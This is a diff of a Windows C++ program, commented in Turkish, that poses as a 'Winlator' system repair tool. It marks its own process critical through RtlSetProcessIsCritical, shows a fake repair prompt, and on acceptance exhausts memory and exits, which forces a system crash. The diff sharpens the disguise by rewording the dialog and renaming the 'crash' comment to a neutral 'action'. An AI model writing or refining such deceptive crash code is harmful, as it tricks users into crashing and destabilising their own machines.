@@ -1,11 +1,11 @@
 #include <windows.h>
 #include <vector>
 
-// Fonksiyon imzasını tanımlıyoruz
+// Kritik işlem fonksiyonu için imza tanımlıyoruz
 typedef NTSTATUS (NTAPI *pfnRtlSetProcessIsCritical)(BOOLEAN bNew, PBOOLEAN pbOld, BOOLEAN bNeedPrivilege);
 
 // Kaynak tüketme fonksiyonu
-DWORD WINAPI KaynakSömür(LPVOID lpParam) {
+DWORD WINAPI KaynakSomur(LPVOID lpParam) {
     std::vector<void*> bellek;
     while (true) {
         void* p = malloc(1024 * 512); 
@@ -26,7 +26,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         CloseHandle(hToken);
     }
 
-    // 2. KRİTİK İŞARETLEME (Dinamik Yükleme - Hata Vermez)
+    // 2. DİNAMİK FONKSİYON YÜKLEME (Hata vermez)
     HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
     if (hNtdll) {
         auto RtlSetProcessIsCritical = (pfnRtlSetProcessIsCritical)GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
@@ -35,11 +35,11 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         }
     }
 
-    // 3. MESAJ VE ÇÖKERTME
-    if (MessageBoxA(NULL, "Sistem onarımı başlatılsın mı?", "Winlator Fixer", MB_YESNO | MB_ICONWARNING) == IDYES) {
-        CreateThread(NULL, 0, KaynakSömür, NULL, 0, NULL);
+    // 3. MESAJ VE AKSİYON
+    if (MessageBoxA(NULL, "Winlator sistem onarımı başlatılsın mı?", "Sistem Aracı", MB_YESNO | MB_ICONWARNING) == IDYES) {
+        CreateThread(NULL, 0, KaynakSomur, NULL, 0, NULL);
         Sleep(3000);
-        exit(0); // Kritik işlem kapandığı için sistem çöker
+        exit(0); // Kritik süreç kapandığı için sistem çöker
     }
 
     return 0;
